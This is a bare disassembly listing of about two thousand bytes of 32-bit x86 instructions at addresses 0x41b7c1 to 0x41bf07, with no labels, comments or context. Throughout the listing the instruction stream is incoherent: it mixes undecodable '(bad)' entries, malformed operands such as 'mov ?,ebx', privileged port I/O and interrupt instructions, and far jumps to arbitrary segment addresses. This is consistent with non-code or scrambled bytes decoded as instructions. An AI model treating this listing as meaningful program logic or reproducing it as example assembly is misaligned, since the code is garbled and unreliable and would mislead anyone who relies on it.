  41b7c1:	iret   
  41b7c2:	xlat   BYTE PTR ds:[ebx]
  41b7c3:	shl    DWORD PTR [esi-0x27],cl
  41b7c6:	and    bh,ah
  41b7c8:	stc    
  41b7c9:	inc    ebx
  41b7ca:	pushw  0x1a22
  41b7ce:	mov    dl,0x6
  41b7d0:	cwde   
  41b7d1:	xchg   esp,eax
  41b7d2:	pop    esi
  41b7d3:	or     BYTE PTR ds:0xa5266f4d,al
  41b7d9:	push   ebx
  41b7da:	inc    ebp
  41b7db:	xor    al,0x2b
  41b7dd:	test   al,0x2d
  41b7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e0:	or     BYTE PTR [ecx-0x10],bh
  41b7e3:	jmp    0x6db6:0xad9ce68d
  41b7ea:	jae    0x41b811
  41b7ec:	imul   esp,DWORD PTR [esi+ecx*1+0x3b],0x12
  41b7f1:	shl    DWORD PTR cs:[ebp-0x5692c3fe],0xfa
  41b7f9:	fldenv es:[ecx-0x46]
  41b7fd:	push   0xffffffe4
  41b7ff:	repz scas eax,DWORD PTR es:[edi]
  41b801:	mov    al,0x22
  41b803:	xchg   edi,eax
  41b804:	imul   ecx,DWORD PTR [edi],0x25
  41b807:	pop    eax
  41b808:	lods   al,BYTE PTR ds:[esi]
  41b809:	gs lahf 
  41b80b:	jp     0x41b7be
  41b80d:	sahf   
  41b80e:	scas   eax,DWORD PTR es:[edi]
  41b80f:	dec    esp
  41b810:	shl    DWORD PTR [edx-0x78],cl
  41b813:	(bad)  
  41b816:	clc    
  41b817:	sbb    al,bh
  41b819:	icebp  
  41b81a:	imul   ebx,DWORD PTR [edx-0x73],0x183fb11a
  41b821:	cmp    eax,0xbdb5ba2d
  41b826:	int3   
  41b827:	and    al,0xb7
  41b829:	cwde   
  41b82a:	and    DWORD PTR [edx],edi
  41b82c:	pop    ecx
  41b82d:	repnz pop esi
  41b82f:	lods   al,BYTE PTR ds:[esi]
  41b830:	lea    edi,[ebx+eiz*4-0x57a47eb7]
  41b837:	xchg   esp,eax
  41b838:	imul   ebx,DWORD PTR [ecx],0x7433c633
  41b83e:	ja     0x41b7f0
  41b840:	loop   0x41b7e8
  41b842:	jmp    0x41b8bf
  41b844:	pop    ecx
  41b845:	pop    edi
  41b846:	mov    ch,0x2e
  41b848:	mov    ah,0x3a
  41b84a:	or     eax,0x1e671974
  41b84f:	repnz lock loop 0x41b82c
  41b853:	(bad)  
  41b854:	in     al,dx
  41b855:	fist   WORD PTR [edx+eiz*4-0x686ed9de]
  41b85c:	push   edi
  41b85d:	stos   BYTE PTR es:[edi],al
  41b85e:	mov    al,ds:0x3fa0fb94
  41b863:	in     al,0xbd
  41b865:	addr16 test al,0xf
  41b868:	mul    DWORD PTR [edx+0x1aec4da4]
  41b86e:	jbe    0x41b85c
  41b870:	mov    ds:0xde7f0ea8,al
  41b875:	or     BYTE PTR [ebx-0x79],bl
  41b878:	popa   
  41b879:	out    0xb8,al
  41b87b:	in     al,dx
  41b87c:	or     BYTE PTR [eax],0xaa
  41b87f:	mov    al,ds:0x357292eb
  41b884:	cmp    ecx,DWORD PTR [ecx+0x780002b6]
  41b88a:	xchg   esi,eax
  41b88b:	push   edi
  41b88c:	adc    dh,BYTE PTR [esi+0x34]
  41b88f:	imul   eax,DWORD PTR [eax-0x681e4c5a],0xffffffe7
  41b896:	test   al,0x55
  41b898:	sub    ebx,DWORD PTR [ecx+0x19]
  41b89b:	mov    ebp,0x2568e8f8
  41b8a0:	daa    
  41b8a1:	lods   al,BYTE PTR gs:[esi]
  41b8a3:	mov    al,ds:0x88052baf
  41b8a8:	les    edx,FWORD PTR [esi+0xd]
  41b8ab:	fs jns 0x41b90f
  41b8ae:	xor    al,0xe2
  41b8b0:	fld    QWORD PTR [edi+0x21d7c381]
  41b8b6:	dec    ebx
  41b8b7:	repnz (bad) 
  41b8b9:	in     al,dx
  41b8ba:	sub    al,0x78
  41b8bc:	lods   al,BYTE PTR ds:[esi]
  41b8bd:	out    0xc9,al
  41b8bf:	cmc    
  41b8c0:	aam    0xed
  41b8c2:	xor    DWORD PTR [edx-0x7b83cd2e],edx
  41b8c8:	or     BYTE PTR [ecx-0x20be183f],bh
  41b8ce:	cli    
  41b8cf:	repz or edi,DWORD PTR [ebp-0x6096d24e]
  41b8d6:	sar    BYTE PTR [esi-0x71a27c13],cl
  41b8dc:	inc    ebp
  41b8dd:	and    esp,DWORD PTR [edi+0x28749f0d]
  41b8e3:	jbe    0x41b897
  41b8e5:	pop    edx
  41b8e6:	scas   al,BYTE PTR es:[edi]
  41b8e7:	and    cl,ah
  41b8e9:	aam    0x25
  41b8eb:	hlt    
  41b8ec:	mov    ds,WORD PTR [edi+edx*2+0x32186df9]
  41b8f3:	dec    esp
  41b8f4:	int    0xd3
  41b8f6:	sbb    al,dl
  41b8f8:	add    dl,BYTE PTR [ebx-0x6e]
  41b8fb:	test   eax,0xc1f572f9
  41b900:	mov    dh,0xc
  41b902:	jge    0x41b983
  41b904:	lods   eax,DWORD PTR ds:[esi]
  41b905:	xor    al,0xf3
  41b907:	and    BYTE PTR [edx],bh
  41b909:	out    dx,eax
  41b90a:	jne    0x41b974
  41b90c:	dec    ebp
  41b90d:	data16 jp 0x41b93e
  41b910:	ins    DWORD PTR es:[edi],dx
  41b911:	sub    al,0x63
  41b913:	xchg   ecx,eax
  41b914:	das    
  41b915:	adc    DWORD PTR [ecx+0x2f],esi
  41b918:	jb     0x41b8df
  41b91a:	push   ebx
  41b91b:	sub    al,0x4b
  41b91d:	pop    ds
  41b91e:	cmp    BYTE PTR [edi+eiz*4],cl
  41b921:	imul   DWORD PTR [esi-0x41225e60]
  41b927:	add    DWORD PTR ds:0x13ce7dd0,esi
  41b92d:	mov    cl,0xf4
  41b92f:	xor    eax,0x8c5458a9
  41b934:	jo     0x41b96b
  41b936:	mov    bh,0x90
  41b938:	or     eax,DWORD PTR [edi-0x39434cb0]
  41b93e:	push   ebp
  41b93f:	jmp    0xd24d:0x9dd4a763
  41b946:	sub    BYTE PTR [edi+ecx*8],ah
  41b949:	call   0x30a3:0x28b38746
  41b950:	lds    edx,FWORD PTR [edi-0x1eb2de40]
  41b956:	imul   BYTE PTR [edi]
  41b958:	mov    ebx,0xb766b10c
  41b95d:	xor    eax,0x8fba216e
  41b962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b963:	aaa    
  41b964:	rdtsc  
  41b966:	enter  0x82c3,0x1d
  41b96a:	jo     0x41b965
  41b96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96d:	stos   BYTE PTR es:[edi],al
  41b96e:	fwait
  41b96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b970:	call   0x39154899
  41b975:	out    0xef,eax
  41b977:	cs push 0xffffffe7
  41b97a:	pop    ss
  41b97b:	push   eax
  41b97c:	mov    ?,ebx
  41b97e:	(bad)  
  41b97f:	sahf   
  41b980:	stos   BYTE PTR es:[edi],al
  41b981:	outs   dx,DWORD PTR ds:[esi]
  41b982:	lock aad 0x3c
  41b985:	std    
  41b986:	sbb    edx,DWORD PTR [esi-0x18ed9460]
  41b98c:	gs ffree st(6)
  41b98f:	lea    esp,[ebx-0x15]
  41b992:	aaa    
  41b993:	inc    ecx
  41b994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b995:	mov    cl,0x50
  41b997:	inc    esi
  41b998:	push   ds
  41b999:	icebp  
  41b99a:	out    dx,eax
  41b99b:	inc    ebx
  41b99c:	test   al,0xc1
  41b99e:	fld    TBYTE PTR [edx+0x64]
  41b9a1:	ret    
  41b9a2:	xchg   edx,eax
  41b9a3:	push   edx
  41b9a4:	push   esp
  41b9a5:	js     0x41b986
  41b9a7:	icebp  
  41b9a8:	dec    esi
  41b9a9:	lds    edx,FWORD PTR [edx+eiz*1-0x26a88795]
  41b9b0:	lahf   
  41b9b1:	aaa    
  41b9b2:	aad    0xde
  41b9b4:	pushf  
  41b9b5:	lock mov ebx,0x3c3aa516
  41b9bb:	cmp    al,0xf3
  41b9bd:	cmp    al,0x29
  41b9bf:	and    bl,BYTE PTR [ebp+0x3a57673]
  41b9c5:	sbb    eax,DWORD PTR [eax]
  41b9c7:	push   esp
  41b9c8:	pop    eax
  41b9c9:	cmp    al,0x5b
  41b9cb:	push   es
  41b9cc:	repnz and DWORD PTR [ebx-0x30],eax
  41b9d0:	not    DWORD PTR [eax+eax*4]
  41b9d3:	in     al,dx
  41b9d4:	fstp   QWORD PTR [ebp-0x75]
  41b9d7:	jb     0x41ba45
  41b9d9:	jl     0x41ba3b
  41b9db:	lock xchg esi,eax
  41b9dd:	not    ebx
  41b9df:	inc    edi
  41b9e0:	mov    esp,0xf339d2c9
  41b9e5:	loop   0x41b9dd
  41b9e7:	jnp    0x41ba05
  41b9e9:	xor    bl,BYTE PTR [ebx-0x3c]
  41b9ec:	cmp    al,BYTE PTR [edi-0x582b176a]
  41b9f2:	sub    ebx,edx
  41b9f4:	aas    
  41b9f5:	es je  0x41ba6c
  41b9f8:	outs   dx,DWORD PTR ds:[esi]
  41b9f9:	stos   BYTE PTR es:[edi],al
  41b9fa:	push   ebp
  41b9fb:	mov    esi,DWORD PTR [ecx+edx*4-0x80]
  41b9ff:	mov    cl,0x36
  41ba02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba03:	xchg   DWORD PTR [eax],edi
  41ba05:	inc    esp
  41ba06:	add    eax,0xb50111a0
  41ba0b:	dec    edx
  41ba0c:	sahf   
  41ba0d:	lahf   
  41ba0e:	jbe    0x41b9ad
  41ba10:	test   al,0xe2
  41ba12:	adc    al,ah
  41ba14:	xchg   ecx,eax
  41ba15:	call   0xd60c93f3
  41ba1a:	pop    esi
  41ba1b:	adc    DWORD PTR [ebx+0x6f8c7d22],ebp
  41ba21:	rep stos DWORD PTR es:[edi],eax
  41ba23:	push   cs
  41ba24:	aas    
  41ba25:	or     dh,BYTE PTR [ebp+0x1]
  41ba28:	sbb    ebx,DWORD PTR [esp+eax*4]
  41ba2b:	cmp    edi,DWORD PTR [ebp-0x45]
  41ba2e:	sbb    edx,eax
  41ba30:	test   eax,0x5d3e94cf
  41ba35:	xchg   edi,eax
  41ba36:	(bad)  
  41ba37:	repnz in al,dx
  41ba39:	push   ebp
  41ba3a:	dec    ebx
  41ba3b:	add    al,0xa3
  41ba3d:	sbb    al,0xfd
  41ba3f:	in     al,dx
  41ba40:	(bad)  
  41ba41:	mov    al,0x84
  41ba43:	shl    DWORD PTR [edi-0x6860b302],1
  41ba49:	iret   
  41ba4a:	mov    bh,0xae
  41ba4c:	loopne 0x41ba71
  41ba4e:	popa   
  41ba4f:	cmp    DWORD PTR [eax],0x36
  41ba52:	dec    edx
  41ba53:	add    eax,0x5a6e0cce
  41ba58:	and    BYTE PTR [ebx],0xcb
  41ba5b:	pop    es
  41ba5c:	xlat   BYTE PTR ds:[ebx]
  41ba5d:	jno    0x41ba50
  41ba5f:	sub    al,0x9d
  41ba61:	add    bl,bl
  41ba63:	mov    WORD PTR [esi+0x5c],fs
  41ba66:	ins    BYTE PTR es:[edi],dx
  41ba67:	add    BYTE PTR [ecx],0x64
  41ba6a:	add    bl,BYTE PTR [ebp+0x49eaf295]
  41ba70:	rcl    BYTE PTR [esi+0x34d1d85f],0x76
  41ba77:	mov    eax,0xc6a6a542
  41ba7c:	xor    ah,BYTE PTR [ecx+0xb7643e6]
  41ba82:	add    DWORD PTR [edx],ebx
  41ba84:	xchg   ebp,eax
  41ba85:	mov    bh,0x1
  41ba87:	call   0x9938:0x77d33409
  41ba8e:	and    bh,ch
  41ba90:	repz push ss
  41ba92:	adc    DWORD PTR [ebx],edx
  41ba94:	and    ebp,edx
  41ba96:	sub    esi,edi
  41ba98:	(bad)  
  41ba99:	dec    esi
  41ba9a:	test   DWORD PTR [edi-0x2e],0xb4b92219
  41baa1:	pop    edx
  41baa2:	imul   ebx,edi,0xffffffd7
  41baa5:	cmp    edx,DWORD PTR [ebx+esi*2+0x60]
  41baa9:	xchg   DWORD PTR [edi-0x5e],esi
  41baac:	jecxz  0x41ba46
  41baae:	(bad)  
  41baaf:	jge    0x41baca
  41bab1:	sbb    eax,0x7207967f
  41bab6:	inc    ebp
  41bab7:	push   eax
  41bab8:	pop    ss
  41bab9:	pop    ebx
  41baba:	popa   
  41babb:	nop
  41babc:	popf   
  41babd:	sub    al,0xea
  41babf:	cli    
  41bac0:	pop    edx
  41bac1:	and    al,0x86
  41bac3:	mov    dh,0xad
  41bac5:	clc    
  41bac6:	loope  0x41ba90
  41bac8:	stos   BYTE PTR es:[edi],al
  41bac9:	pop    ss
  41baca:	fdiv   st,st(2)
  41bacc:	xchg   edx,eax
  41bacd:	pop    ss
  41bace:	ins    BYTE PTR es:[edi],dx
  41bacf:	jae    0x41baf2
  41bad1:	sub    al,0xc4
  41bad3:	and    eax,0x803efbac
  41bad8:	ret    
  41bad9:	mov    edx,0x78e8f57c
  41bade:	out    dx,al
  41badf:	xor    eax,0x77dbbe55
  41bae4:	inc    edi
  41bae5:	add    al,0x93
  41bae7:	(bad)  
  41bae9:	aad    0x37
  41baeb:	mov    dl,0x15
  41baed:	clc    
  41baee:	add    al,0x3c
  41baf0:	sub    DWORD PTR [eax+0x6a5e1d0c],edx
  41baf6:	push   es
  41baf7:	jge    0x41bac3
  41baf9:	ins    DWORD PTR es:[edi],dx
  41bafa:	xchg   DWORD PTR [edx-0x5a3f0b7a],ebp
  41bb00:	repnz les ebp,FWORD PTR [ecx]
  41bb03:	pop    esi
  41bb04:	xchg   ebp,eax
  41bb05:	ficom  WORD PTR [ebx+0x1ca788dd]
  41bb0b:	outs   dx,DWORD PTR ds:[esi]
  41bb0c:	sbb    eax,0xd516ce6e
  41bb11:	dec    ecx
  41bb12:	jnp    0x41bb59
  41bb14:	bound  esi,QWORD PTR [esp+ebx*1+0x6aa841b1]
  41bb1b:	arpl   WORD PTR [ecx],ax
  41bb1d:	mov    bl,0xad
  41bb1f:	mov    al,ds:0x7b113d3b
  41bb24:	popa   
  41bb25:	fcomp  DWORD PTR [edi-0x2f]
  41bb28:	sbb    dh,BYTE PTR [eax-0x199bda13]
  41bb2e:	sub    DWORD PTR [edx],0xe8e09554
  41bb34:	int3   
  41bb35:	pop    es
  41bb36:	sbb    DWORD PTR [ebx+ebx*8-0x582ecd3c],esp
  41bb3d:	in     eax,dx
  41bb3e:	pop    edx
  41bb3f:	pop    ss
  41bb40:	mov    ebp,0xd53ac71d
  41bb45:	sbb    eax,0xd6d3260f
  41bb4a:	das    
  41bb4b:	mov    WORD PTR [ecx-0x45ce6f2f],es
  41bb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb52:	stos   BYTE PTR es:[edi],al
  41bb53:	iret   
  41bb54:	fld    DWORD PTR [ecx+edx*8]
  41bb57:	mov    esp,0x39b9a1e0
  41bb5c:	mov    ah,0x51
  41bb5e:	push   cs
  41bb5f:	push   ecx
  41bb60:	sub    cl,BYTE PTR [edi+0x7d82b55e]
  41bb66:	mov    BYTE PTR [edx+0x7b],bl
  41bb69:	test   DWORD PTR [esi+0x2],edi
  41bb6c:	cs repz inc esi
  41bb6f:	lods   eax,DWORD PTR ds:[esi]
  41bb70:	in     eax,0xfa
  41bb72:	cmp    al,0x89
  41bb74:	jg     0x41bbe3
  41bb76:	jecxz  0x41bb3d
  41bb78:	xchg   edx,eax
  41bb79:	repnz in eax,dx
  41bb7b:	mov    esi,gs
  41bb7d:	and    BYTE PTR [edi-0x4a],0x36
  41bb81:	inc    esp
  41bb82:	test   BYTE PTR [eax+0x58],dh
  41bb85:	inc    ebp
  41bb86:	lahf   
  41bb87:	stos   BYTE PTR es:[edi],al
  41bb88:	outs   dx,BYTE PTR ds:[esi]
  41bb89:	pop    ss
  41bb8a:	or     eax,0x2669d267
  41bb8f:	xor    al,0xf
  41bb91:	mov    esi,DWORD PTR [ebx]
  41bb93:	or     eax,0x8e6dd0c
  41bb98:	push   ebp
  41bb99:	add    edi,ecx
  41bb9b:	ins    DWORD PTR es:[edi],dx
  41bb9c:	push   0x2eed31d2
  41bba1:	and    eax,0xa40685df
  41bba6:	sbb    ah,dh
  41bba8:	push   esp
  41bba9:	fs test DWORD PTR ds:[ebx-0x44d387d],edi
  41bbb1:	mov    dl,0xee
  41bbb3:	imul   eax,DWORD PTR [ecx+0x49cb29a2],0x42
  41bbba:	jae    0x41bbba
  41bbbc:	lock cwde 
  41bbbe:	inc    ebp
  41bbbf:	sub    eax,0x56ad1565
  41bbc4:	int3   
  41bbc5:	in     eax,0xee
  41bbc7:	pop    ecx
  41bbc8:	jno    0x41bbd0
  41bbca:	and    ah,BYTE PTR [edx-0x63]
  41bbcd:	imul   edi,DWORD PTR [esi],0x8ea6f48a
  41bbd3:	(bad)  
  41bbd4:	cmp    al,0x71
  41bbd6:	mov    edi,DWORD PTR ds:[ebp+0x9]
  41bbda:	enter  0xb667,0xb7
  41bbde:	inc    ebp
  41bbdf:	inc    ebp
  41bbe0:	xor    edi,DWORD PTR ds:[edx]
  41bbe3:	push   ebx
  41bbe4:	ins    DWORD PTR es:[edi],dx
  41bbe5:	out    dx,al
  41bbe6:	xchg   esi,eax
  41bbe7:	pushf  
  41bbe8:	popf   
  41bbe9:	adc    DWORD PTR [edi-0x53],eax
  41bbec:	add    ah,0x34
  41bbef:	pop    ss
  41bbf0:	or     DWORD PTR [ecx],ebx
  41bbf2:	int3   
  41bbf3:	clc    
  41bbf4:	cli    
  41bbf5:	xchg   eax,ebp
  41bbf7:	push   ebp
  41bbf8:	test   eax,0x2fe2e484
  41bbfd:	push   ds
  41bbfe:	imul   ecx,DWORD PTR [ecx-0x69],0x2183f6e4
  41bc05:	mov    bl,BYTE PTR [eax]
  41bc07:	(bad)  
  41bc08:	fstp   DWORD PTR [edi-0x69]
  41bc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc0c:	mov    edx,0xc8fac3f
  41bc11:	(bad)  
  41bc12:	scas   al,BYTE PTR es:[edi]
  41bc13:	mov    ch,0x18
  41bc15:	leave  
  41bc16:	ds xchg esi,eax
  41bc18:	fldcw  WORD PTR [esi-0xf9e7e6e]
  41bc1e:	xchg   ebx,eax
  41bc1f:	and    al,0xfa
  41bc21:	jo     0x41bbfb
  41bc23:	jmp    0x3fedec27
  41bc28:	test   eax,0xf69b80bf
  41bc2d:	aad    0x8
  41bc2f:	sbb    edi,DWORD PTR [esi+0xb]
  41bc32:	adc    al,0xc
  41bc34:	or     BYTE PTR [edi-0x43669df6],dl
  41bc3a:	call   0x17efa5ef
  41bc3f:	jbe    0x41bc80
  41bc41:	lea    edi,[eax-0x4e251411]
  41bc47:	aad    0x86
  41bc49:	push   edi
  41bc4a:	rcl    BYTE PTR [esi-0x7a152b5a],cl
  41bc50:	out    0x41,eax
  41bc52:	pop    ss
  41bc53:	out    dx,eax
  41bc54:	repz fdiv DWORD PTR ds:0xd13cf615
  41bc5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5c:	cli    
  41bc5d:	sub    edi,DWORD PTR [ebp+0x21536b63]
  41bc63:	xor    eax,0xd3c29854
  41bc68:	push   0xf3ec23b5
  41bc6d:	push   ecx
  41bc6e:	test   eax,0xb2b5309b
  41bc73:	xchg   ebx,eax
  41bc74:	push   0xd13c1e7e
  41bc79:	or     al,al
  41bc7b:	mov    ?,WORD PTR [ebx]
  41bc7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc7e:	xor    eax,0x615a4e6a
  41bc83:	mov    ds:0x31503ebb,al
  41bc88:	push   esi
  41bc89:	dec    edi
  41bc8a:	mov    ebp,0x28ee06e1
  41bc8f:	sub    dl,BYTE PTR [ecx]
  41bc91:	test   al,0xfb
  41bc93:	mov    WORD PTR [edx-0x3],?
  41bc96:	ret    
  41bc97:	or     edx,DWORD PTR [edx]
  41bc99:	pop    eax
  41bc9a:	pop    esp
  41bc9b:	lock jmp 0x73ad:0x99ecefd3
  41bca3:	sbb    al,ch
  41bca5:	clc    
  41bca6:	pop    esp
  41bca7:	jge    0x41bc7a
  41bca9:	lea    ebp,[ebp+0x55]
  41bcac:	clc    
  41bcad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcae:	mov    edi,0xbed5eb66
  41bcb3:	mov    eax,0x9728439f
  41bcb8:	mov    cs,WORD PTR [edx]
  41bcba:	sub    esp,ecx
  41bcbc:	addr16 push ss
  41bcbe:	adc    DWORD PTR [esi+eax*8+0x6ca0cdf5],edx
  41bcc5:	push   esp
  41bcc6:	jb     0x41bcb5
  41bcc8:	lahf   
  41bcc9:	nop
  41bcca:	cmp    BYTE PTR [ebx+0x43855a6d],ah
  41bcd0:	aas    
  41bcd1:	repz dec ecx
  41bcd3:	lea    edx,[esi-0x1741cc1a]
  41bcd9:	fldcw  WORD PTR [esi+0x818ec04]
  41bcdf:	je     0x41bcd3
  41bce1:	imul   esp,DWORD PTR gs:[ebp-0x766eb38a],0xffffffc1
  41bce9:	adc    eax,0x81d3b5f9
  41bcee:	gs jg  0x41bd29
  41bcf1:	mov    al,0xf9
  41bcf3:	push   0xffffff9b
  41bcf5:	nop
  41bcf6:	mov    eax,0xf06943b3
  41bcfb:	xchg   ecx,eax
  41bcfc:	adc    BYTE PTR [ebx-0x73d7fa94],dl
  41bd02:	jp     0x41bd4e
  41bd04:	and    eax,DWORD PTR [ebp-0x56]
  41bd07:	stc    
  41bd08:	jecxz  0x41bd24
  41bd0a:	(bad)  
  41bd0b:	xchg   esi,eax
  41bd0c:	inc    ecx
  41bd0d:	pop    eax
  41bd0e:	pop    esp
  41bd10:	dec    esp
  41bd11:	dec    ebx
  41bd12:	xor    eax,0x9a4b9a0a
  41bd17:	and    DWORD PTR [eax+0x26],ecx
  41bd1a:	cli    
  41bd1b:	icebp  
  41bd1c:	aad    0x24
  41bd1e:	xchg   esp,eax
  41bd1f:	mov    edx,0xa1097714
  41bd24:	sub    DWORD PTR [edi+0x8a8725],edx
  41bd2a:	repnz idiv ebx
  41bd2d:	xchg   edx,eax
  41bd2e:	add    BYTE PTR [ecx],bl
  41bd30:	std    
  41bd31:	jno    0x41bd50
  41bd33:	mov    ch,0xba
  41bd35:	rcl    cl,cl
  41bd37:	jo     0x41bcbb
  41bd39:	mov    ds:0xf14847d1,al
  41bd3e:	fst    st(0)
  41bd40:	nop
  41bd41:	xor    bh,bh
  41bd43:	std    
  41bd44:	scas   eax,DWORD PTR es:[edi]
  41bd45:	in     eax,0xc3
  41bd47:	or     eax,ebp
  41bd49:	scas   eax,DWORD PTR es:[edi]
  41bd4a:	stos   DWORD PTR es:[edi],eax
  41bd4b:	repnz loopne 0x41bd97
  41bd4e:	lock dec ebx
  41bd50:	push   esp
  41bd51:	mov    BYTE PTR [edi+0x52f42183],bh
  41bd57:	adc    ebx,DWORD PTR [ecx]
  41bd59:	ror    BYTE PTR [ebx-0x29],0x14
  41bd5d:	mov    esp,0x56efe7c9
  41bd62:	arpl   sp,cx
  41bd64:	lods   al,BYTE PTR ds:[esi]
  41bd65:	gs scas eax,DWORD PTR es:[edi]
  41bd67:	std    
  41bd68:	and    ah,dh
  41bd6a:	cmp    ecx,DWORD PTR [ebx+ebp*4-0x72528b2d]
  41bd71:	cmp    al,0xf2
  41bd73:	aaa    
  41bd74:	mov    bl,0xdc
  41bd76:	xlat   BYTE PTR ds:[ebx]
  41bd77:	ret    0x26a9
  41bd7a:	es inc ebp
  41bd7c:	aad    0x90
  41bd7e:	dec    eax
  41bd7f:	mov    edi,0x5f57f92a
  41bd84:	inc    esi
  41bd85:	test   eax,0x10a0c0a8
  41bd8a:	jb     0x41bd80
  41bd8c:	mov    esp,0x8d0436aa
  41bd91:	shl    BYTE PTR [eax-0x6e],cl
  41bd94:	lods   eax,DWORD PTR ds:[esi]
  41bd95:	in     al,0x26
  41bd97:	leave  
  41bd98:	and    al,0x27
  41bd9a:	adc    DWORD PTR ds:0xbed7afda,edx
  41bda0:	retf   0x92e1
  41bda3:	loop   0x41bd74
  41bda5:	clc    
  41bda6:	xchg   ecx,eax
  41bda7:	inc    esp
  41bda8:	sbb    al,0x2
  41bdaa:	dec    edi
  41bdab:	and    BYTE PTR [edi-0x2559f5a],cl
  41bdb1:	mov    al,ds:0x8b1a6c40
  41bdb6:	outs   dx,BYTE PTR ds:[esi]
  41bdb7:	aad    0xab
  41bdb9:	add    DWORD PTR [ecx+0x3f],0x9172a676
  41bdc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdc1:	xor    bh,BYTE PTR [edx+0x3]
  41bdc4:	scas   al,BYTE PTR es:[edi]
  41bdc5:	out    dx,eax
  41bdc6:	das    
  41bdc7:	jmp    0xea64:0x82260286
  41bdce:	inc    esp
  41bdcf:	cmp    BYTE PTR [esi+0x2e],ch
  41bdd2:	mov    ds:0x6985163,al
  41bdd7:	ja     0x41bd97
  41bdd9:	push   eax
  41bdda:	fiadd  WORD PTR [esi+0x1f]
  41bddd:	stc    
  41bdde:	sub    eax,0x986fd48c
  41bde3:	add    DWORD PTR [edi],ebp
  41bde5:	pushf  
  41bde6:	sbb    DWORD PTR [edi-0xa966d7],esp
  41bdec:	imul   edx,DWORD PTR [ecx+0x13593478],0x64
  41bdf3:	xor    edx,DWORD PTR [ebx+ecx*4-0x45a7f518]
  41bdfa:	xchg   ebx,eax
  41bdfb:	inc    edi
  41bdfc:	pop    ss
  41bdfd:	or     eax,0xd0dbc076
  41be02:	iret   
  41be03:	add    al,0x5f
  41be05:	jb     0x41bdc3
  41be07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be08:	loopne 0x41be13
  41be0a:	es daa 
  41be0c:	or     al,BYTE PTR [eax+0x4]
  41be0f:	dec    edi
  41be10:	cld    
  41be11:	add    BYTE PTR [ecx],bl
  41be13:	(bad)  
  41be14:	mov    bl,0x40
  41be16:	in     al,0x46
  41be18:	mov    dh,0xe3
  41be1a:	(bad)  
  41be1b:	xchg   esp,eax
  41be1c:	(bad)  
  41be1d:	retf   0x3e3a
  41be20:	in     al,dx
  41be21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be22:	addr16 ss xchg ecx,eax
  41be25:	in     eax,dx
  41be26:	fwait
  41be27:	in     al,0xa4
  41be29:	mov    ah,0x3d
  41be2b:	dec    esi
  41be2c:	ja     0x41be15
  41be2e:	push   cs
  41be2f:	lock mov esp,0xbd398764
  41be35:	cld    
  41be36:	inc    ebx
  41be37:	das    
  41be38:	imul   edi,DWORD PTR [ebp-0x3bc84dfe],0x34
  41be3f:	call   0xe602:0x411a7bd4
  41be46:	lahf   
  41be47:	add    dl,bh
  41be49:	arpl   WORD PTR [edi],bp
  41be4b:	adc    al,0xe5
  41be4d:	xchg   ebx,eax
  41be4e:	sub    edx,DWORD PTR [eax]
  41be50:	xor    ch,bh
  41be52:	mov    bl,0xb0
  41be54:	dec    ebp
  41be55:	jmp    0xd9f4:0x8d3b71ea
  41be5c:	(bad)  
  41be5d:	addr16 jnp 0x41be04
  41be60:	mov    bh,0xba
  41be62:	stc    
  41be63:	sbb    cl,ah
  41be65:	outs   dx,BYTE PTR ds:[esi]
  41be66:	xor    al,0xd
  41be68:	inc    esi
  41be69:	xlat   BYTE PTR ds:[ebx]
  41be6a:	call   0x91df:0x9d460aea
  41be71:	ins    BYTE PTR es:[edi],dx
  41be72:	leave  
  41be73:	sar    edx,0xfb
  41be76:	mov    edi,0xfe14d0e6
  41be7b:	pop    ebx
  41be7c:	jecxz  0x41be0c
  41be7e:	stos   DWORD PTR es:[edi],eax
  41be7f:	int    0x90
  41be81:	jns    0x41bed8
  41be83:	jnp    0x41be21
  41be85:	or     eax,0xc21a2c05
  41be8a:	out    0x44,eax
  41be8c:	outs   dx,DWORD PTR ds:[esi]
  41be8d:	stos   BYTE PTR es:[edi],al
  41be8e:	xchg   edx,eax
  41be8f:	sar    BYTE PTR [ecx+0x4622dd6],1
  41be95:	call   0x9a2e:0x22326d81
  41be9c:	push   ss
  41be9d:	(bad)
  41bea0:	or     BYTE PTR [eax],0xfa
  41bea3:	std    
  41bea4:	imul   al
  41bea6:	fistp  QWORD PTR [ebx+0x72]
  41bea9:	ret    0x1f86
  41beac:	pop    es
  41bead:	rcl    dh,cl
  41beaf:	jnp    0x41bf1e
  41beb1:	(bad)  
  41beb2:	fcom   QWORD PTR [esi+0x17]
  41beb5:	mov    edi,0x25659601
  41beba:	dec    ecx
  41bebb:	jmp    0xcd67:0x798246da
  41bec2:	scas   al,BYTE PTR es:[edi]
  41bec3:	inc    esp
  41bec4:	add    DWORD PTR [ebp+0x57774c92],eax
  41beca:	icebp  
  41becb:	popa   
  41becc:	sub    DWORD PTR ss:[edx],ecx
  41becf:	ror    DWORD PTR [edx],cl
  41bed1:	push   cs
  41bed2:	(bad)  
  41bed4:	inc    ecx
  41bed5:	(bad)  
  41bed6:	mov    ch,0x29
  41bed8:	dec    edi
  41bed9:	xor    bl,BYTE PTR [ecx+eax*8]
  41bedc:	jae    0x41bf10
  41bede:	in     al,0x25
  41bee0:	ret    0xdcc0
  41bee3:	int3   
  41bee4:	or     eax,DWORD PTR [ecx-0x5d809152]
  41beea:	pop    eax
  41beeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beec:	or     BYTE PTR [edx*8-0x44a8641f],cl
  41bef3:	(bad)  
  41bef4:	cmp    ah,BYTE PTR [edi+0x5405110e]
  41befa:	into   
  41befb:	sub    eax,DWORD PTR [esi+0x7f9df2b8]
  41bf01:	push   cs
  41bf02:	mov    ecx,0xb7874059
  41bf07:	scas   al,BYTE PTR es:[edi]
